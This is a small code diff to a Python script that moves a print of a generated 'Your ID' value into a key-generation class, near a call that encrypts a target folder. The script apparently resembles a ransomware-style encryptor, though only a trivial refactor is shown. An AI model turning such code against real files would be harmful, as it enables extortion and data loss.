@@ -127,6 +127,7 @@ class Key:
         self.generate_key()
         self.key_id = uuid.uuid4()
         self.write_key()
+        print("Your ID : " + str(self.key_id))
 
     def generate_key(self):
         """
@@ -158,6 +159,3 @@ if __name__ == "__main__":
 
     # Encrypt folder
     crypto.encrypt_folder(TARGET_PATH)
-
-    # Display ID
-    print("Your ID : " + str(key.key_id))
